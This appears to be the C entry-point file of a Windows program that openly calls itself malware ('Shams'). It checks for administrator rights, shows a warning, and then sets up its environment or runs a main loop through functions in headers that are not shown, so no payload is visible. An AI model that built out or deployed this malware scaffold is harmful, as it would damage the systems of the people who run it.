#include "headers/fallback.h"
#include "headers/tools.h"
#include "headers/warning.h"
#include "headers/setup.h"
#include "headers/mainstate.h"

void _entry(){
    crash_checker();
    if(check_if_can_ran()){
        MessageBoxW(NULL, L"Your System Is Safe From This Malware", L"Shams", MB_OK | MB_ICONINFORMATION);
        ExitProcess(0);
    }
    if(!check_if_ran()){
        if(!is_admin()){
            MessageBoxW(NULL, L"Please Run This As Administrator", L"you will regret what you did to me", MB_OK | MB_ICONERROR);
            ExitProcess(0);;
        }
        if(run_warning() == TRUE){
            setup_enviroment();
        }
        else ExitProcess(0);; 
    }
    else {
        main_loop();
    }
    ExitProcess(0);
}